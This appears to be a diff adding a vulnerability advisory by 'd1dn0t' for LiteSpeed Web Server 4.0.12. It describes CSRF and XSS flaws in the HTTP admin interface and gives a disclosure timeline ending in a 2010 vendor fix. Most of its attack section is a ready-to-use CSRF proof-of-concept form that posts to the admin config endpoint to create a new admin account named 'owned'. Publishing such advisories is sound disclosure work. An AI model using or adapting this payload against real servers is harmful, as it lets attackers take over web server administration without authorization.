@@ -1,0 +1,43 @@
+# Author: d1dn0t (didnot[at]me[dot]com)
+# Software Link:
+http://www.litespeedtech.com/litespeed-web-server-downloads.html
+# Version: 4.0.12
+# Greetz: Muts/Ryujin/Kernel_Saunders
+
+[ 0x00 ] Product Description
+
+LiteSpeed Web Server is the leading high-performance, high-scalability web
+server. It is completely Apache interchangeable so LiteSpeed Web Server
+can quickly replace a major bottleneck in your existing web delivery
+platform. With its comprehensive range of features and easy-to-use
+web administration console, LiteSpeed Web Server can help you
+conquer the challenges of deploying an effective web serving architecture.
+
+[ 0x01 ] Vulnerability Details
+
+The Web based HTTP Admin interface is vulnerable to a CSRF exploit to
+add additional admin users.
+The admin interface also has XSS issues in the Notes field of the
+Virtual Server configuration.
+
+[ 0x02 ] Vulnerability Timeline
+
+2010-02-04 Discovery
+2010-02-04 Initial Disclosure to Vendor
+2010-02-04 Vendor Response, fix in progress
+2010-02-18 Vendor Fix Released
+
+[ 0x03 ] Vulnerability
+
+<form name="csrf" action="http://192.168.1.10:7080/config/confMgr.php"
+method="post" target="hidden">
+<input type="hidden" name="a" value="s" />
+<input type="hidden" name="m" value="admin" />
+<input type="hidden" name="p" value="security" />
+<input type="hidden" name="t" value="`ADMIN_USR_NEW" />
+<input type="hidden" name="r" value="" />
+<input type="hidden" name="file_create" value="" />
+<input type="hidden" name="name" value="owned" />
+<input type="hidden" name="pass" value="password" />
+<input type="hidden" name="pass1" value="password" />
+</form>
